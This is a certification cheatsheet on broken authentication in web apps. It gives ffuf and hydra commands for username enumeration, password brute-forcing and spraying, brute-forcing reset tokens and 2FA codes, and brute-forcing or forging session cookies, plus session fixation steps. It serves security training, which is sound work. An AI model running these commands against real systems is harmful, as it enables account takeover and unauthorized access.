---
title: "CWES Cheatsheet — Broken Authentication"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, broken-authentication, auth-bypass]
---

broken authentication covers weaknesses in login, registration, password reset, and session management that let you bypass authentication or take over accounts. this is one of those topics where understanding the logic matters more than knowing the tool.

---

## brute-force attacks

### user enumeration

user enumeration vulnerabilities occur when a web application responds differently to registered/valid versus invalid inputs. even well-known applications like WordPress allow user enumeration by default.

**identify different error messages:**

```
Invalid username: "Unknown user" or "User not found"
Valid username but wrong password: "Invalid password" or "Incorrect password"

-> Different messages = you can enumerate valid usernames
```

**enumerate with ffuf:**

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" \
  -fr "Unknown user"
```

> we filter out responses containing "Unknown user" -- remaining results are valid usernames.

**other places to enumerate users:**

```
- Registration page: "Username already taken"
- Password reset: "No account found with that email" vs "Reset link sent"
- API responses: different status codes for valid/invalid users
```

> **tip:** user enumeration can also occur via side-channel attacks like response timing. if the app only does database lookups for valid usernames, valid usernames may take slightly longer to respond.
{: .prompt-tip }

**timing-based enumeration with ffuf:**

```bash
# Sort by response time -- valid users may take longer
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
  -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fs <default_size>
```

### brute-forcing passwords

**filter wordlist to match password policy (saves massive time):**

```bash
# If policy requires: 10+ chars, uppercase, lowercase, digit
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | \
  grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

# Or with single awk command
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' \
  /usr/share/wordlists/rockyou.txt > custom_wordlist.txt
```

> rockyou.txt contains 14M+ passwords. filtering by password policy reduces it to ~150K -- a reduction of about 99%. this massively speeds up brute forcing.
{: .prompt-info }

**brute force with ffuf:**

```bash
ffuf -w ./custom_wordlist.txt \
  -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -fr "Invalid username"
```

**brute force with hydra:**

```bash
hydra -l admin -P ./custom_wordlist.txt -f TARGET_IP -s PORT \
  http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid"
```

### brute-forcing password reset tokens

password reset tokens enable an attacker to reset an account's password without knowledge of the password. they can be leveraged as an attack vector to take over a victim's account if implemented incorrectly.

**step 1: request a password reset for the target user**

```
Enter victim's email/username in the password reset form
-> This creates a reset token on the server
```

**step 2: analyze the token format**

```
# Example reset URL received:
http://target.htb/reset_password.php?token=7351

# Token is only 4 digits -> 10,000 possible values -> easily brute-forced
```

**step 3: generate wordlist of all possible tokens**

```bash
# 4-digit token (0000-9999)
seq -w 0 9999 > tokens.txt

# 6-digit token (000000-999999)
seq -w 0 999999 > tokens.txt

# Verify padding works
head tokens.txt
# 0000
# 0001
# 0002
```

**step 4: brute force the token with ffuf**

```bash
ffuf -w ./tokens.txt \
  -u "http://TARGET/reset_password.php?token=FUZZ" \
  -fr "The provided token is invalid"
```

**step 5: use the found token to reset the password**

```
Visit: http://TARGET/reset_password.php?token=6182
-> Set new password -> login as the victim
```

**common weak token patterns:**

| Token Type | Weakness | Wordlist |
|---|---|---|
| 4-digit number | Only 10K possibilities | `seq -w 0 9999` |
| 6-digit number | Only 1M possibilities | `seq -w 0 999999` |
| Timestamp-based | Predictable if you know request time | Generate timestamps around request time |
| Sequential | Predictable if you know other tokens | Increment/decrement from known token |
| MD5 of username | Predictable | `echo -n "admin" \| md5sum` |
| UUID v1 | Contains timestamp, partially predictable | Specialized tools |

### default credentials

> always try default creds BEFORE brute forcing.
{: .prompt-tip }

| Application | Default Username | Default Password |
|---|---|---|
| WordPress | admin | admin |
| phpMyAdmin | root | (empty) |
| Tomcat | tomcat | tomcat / s3cret |
| Jenkins | admin | admin |
| Joomla | admin | admin |
| Drupal | admin | admin |
| Grafana | admin | admin |
| pgAdmin | admin | admin |

```bash
# Use combined default creds wordlist
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  ftp://TARGET

# Web default creds list
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
```

### password spraying

try ONE common password against MANY users (avoids lockout).

```bash
# Spray one password against all enumerated users
hydra -L valid_users.txt -p 'Password123!' -f TARGET_IP -s PORT \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Common passwords to spray
Password1
Password123
Password123!
Welcome1
Company2024
Summer2024!
```

### brute-forcing 2FA codes

TOTPs typically consist only of digits, making them potentially guessable if the length is insufficient and the web application does not implement measures against successive submission of incorrect TOTPs.

**step 1: login with valid credentials first**

```
Username: admin
Password: admin
-> App shows 2FA page asking for TOTP code
```

**step 2: capture the 2FA request in Burp**

```
POST /2fa.php HTTP/1.1
Cookie: PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93
Content-Type: application/x-www-form-urlencoded

otp=1234
```

> **important:** note your `PHPSESSID` cookie -- you MUST include it when brute forcing. the 2FA code is tied to your authenticated session.
{: .prompt-warning }

**step 3: generate wordlist**

```bash
# 4-digit TOTP (most common weak implementation)
seq -w 0 9999 > tokens.txt

# 6-digit TOTP (standard authenticator apps)
seq -w 0 999999 > tokens.txt
```

**step 4: brute force with ffuf**

```bash
ffuf -w ./tokens.txt \
  -u http://TARGET/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
  -d "otp=FUZZ" \
  -fr "Invalid 2FA Code"
```

> we get many hits because after the correct TOTP is supplied, our session is marked as fully authenticated. all subsequent requests using our session cookie are redirected. since `6513` was the first hit, that was the correct TOTP.
{: .prompt-info }

**step 5: access the protected page**

```
Visit: http://TARGET/admin.php
(use the same browser/session that passed 2FA)
```

**key points for 2FA brute forcing:**

```
- You MUST login with valid creds first (step 1 before 2FA)
- You MUST use the same session cookie (PHPSESSID) throughout
- 4-digit code = 10,000 possibilities -> seconds to brute force
- 6-digit code = 1,000,000 possibilities -> still feasible if no rate limit
- First hit in ffuf results = correct code (rest are redirects because session is now authenticated)
- If session expires during brute force -> re-login and get new PHPSESSID
```

---

## attacking session tokens

### brute-forcing weak session tokens

if a session token does not provide sufficient randomness and is cryptographically weak, we can brute-force valid session tokens. this can occur if a token is too short or contains static data that does not provide randomness.

**step 1: capture multiple session tokens and analyze them**

```bash
# Login multiple times, collect session cookies:
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9

# Compare them -- look for static vs dynamic parts:
# Static:  2c0c58b27c71a2ec5bf2b4____92b9f9
# Dynamic: only 4 characters change     ^^^^
# 28 out of 32 chars are static!
```

**step 2: brute force the dynamic part**

```bash
# If 4 hex characters change -> 65,536 possibilities (0000-ffff)
# Generate wordlist
python3 -c "
for i in range(0x10000):
    print(f'2c0c58b27c71a2ec5bf2b4{i:04x}92b9f9')
" > sessions.txt

# Fuzz with ffuf
ffuf -w sessions.txt \
  -u http://TARGET/admin.php \
  -H "Cookie: session=FUZZ" \
  -fs <default_size>
```

**sequential/incrementing tokens:**

```bash
# If tokens look like:
141233
141234
141237
141238

# Simply increment/decrement to find other sessions
seq 141000 142000 > sessions.txt

ffuf -w sessions.txt \
  -u http://TARGET/admin.php \
  -H "Cookie: session=FUZZ" \
  -fs <default_size>
```

> it is crucial to capture multiple session tokens and analyze them to ensure that session tokens provide sufficient randomness. incrementing session identifiers make enumeration of all past and future sessions trivial.
{: .prompt-info }

### attacking predictable/encoded session tokens

the simplest form of predictable session tokens contains encoded data we can tamper with. while a session token might seem random at first, a simple analysis may reveal that it is base64-encoded data.

**step 1: decode the session token**

```bash
# Base64 encoded token
echo -n 'dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy' | base64 -d
# Output: user=htb-stdnt;role=user

# Hex encoded token
echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
# Output: user=htb-stdnt;role=user

# URL encoded token
python3 -c "import urllib.parse; print(urllib.parse.unquote('user%3Dhtb-stdnt%3Brole%3Duser'))"
# Output: user=htb-stdnt;role=user
```

**step 2: forge admin token**

```bash
# Base64 -- change role to admin
echo -n 'user=htb-stdnt;role=admin' | base64
# Output: dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==

# Hex -- change role to admin
echo -n 'user=htb-stdnt;role=admin' | xxd -p
# Output: 757365723d6874622d7374646e743b726f6c653d61646d696e

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('user=htb-stdnt;role=admin'))"
```

**step 3: use the forged token**

```bash
curl http://TARGET/admin.php -H "Cookie: session=dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg=="
```

**common patterns to look for in session tokens:**

| What You See | Encoding | How to Decode |
|---|---|---|
| Ends with `=` or `==` | Base64 | `echo TOKEN \| base64 -d` |
| All hex characters (0-9, a-f) | Hex | `echo TOKEN \| xxd -r -p` |
| Contains `%3D`, `%3B` | URL encoding | `python3 -c "import urllib.parse; print(urllib.parse.unquote('TOKEN'))"` |
| Looks like JSON with dots | JWT | `echo PART \| base64 -d` (split by dots) |
| Readable key=value pairs | Plaintext | Just modify directly |

> another variant of session tokens contains the result of encrypting a data sequence. a weak cryptographic algorithm could lead to privilege escalation or authentication bypass. however, it is often challenging to attack encryption-based session tokens in a blackbox approach without access to the source code.
{: .prompt-info }

### session fixation

a web application vulnerable to session fixation does not assign a new session token after successful authentication. if an attacker can coerce the victim into using a session token chosen by the attacker, the attacker can steal the victim's session.

**how the attack works:**

```
1. Attacker authenticates -> gets session token: a1b2c3d4e5f6
2. Attacker logs out (invalidates own session)
3. Attacker sends victim a link:
   http://vulnerable.htb/?sid=a1b2c3d4e5f6
4. Victim clicks link -> app sets Cookie: session=a1b2c3d4e5f6
5. Victim logs in -> app does NOT assign new token
6. Attacker uses a1b2c3d4e5f6 -> hijacks victim's authenticated session
```

**how to test for session fixation:**

```
1. Login -> note your session token
2. Logout
3. Login again -> is the session token DIFFERENT?
   -> Same token = vulnerable to session fixation
   -> New token = properly implemented

4. Try setting session via URL parameter:
   http://TARGET/?sid=ATTACKER_TOKEN
   -> Does the app set your cookie to that value?
   -> If yes -> vulnerable
```

> a web application must assign a new randomly generated session token after successful authentication to prevent session fixation attacks.
{: .prompt-info }

### improper session timeout

if a web application does not define a session timeout, the session token remains valid indefinitely, allowing an attacker to effectively use a hijacked session for an unlimited period.

**how to test:**

```
1. Login -> note session token
2. Wait significant time (30 min, 1 hour, etc.)
3. Try using the same session token
   -> Still works after hours? = weak session timeout
   -> Expired? = properly implemented
```

> there is no universal session timeout value. a web application dealing with sensitive health data should set timeout in minutes. a social media app might set multiple hours.
{: .prompt-info }

### session attack quick reference

| Attack | What to Look For | Exploit |
|---|---|---|
| Weak token (short) | 4-8 char tokens | Brute force all possibilities |
| Partially static token | Multiple tokens share most characters | Brute force only the dynamic part |
| Sequential token | Tokens increment (141233, 141234...) | Increment/decrement to find others |
| Base64 encoded token | Ends with `=`, decodes to readable text | Decode -> modify role -> re-encode |
| Hex encoded token | All hex chars | Decode -> modify -> re-encode |
| Session fixation | Token doesn't change after login | Set victim's token via URL parameter |
| No session timeout | Token works indefinitely | Use stolen token anytime |

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
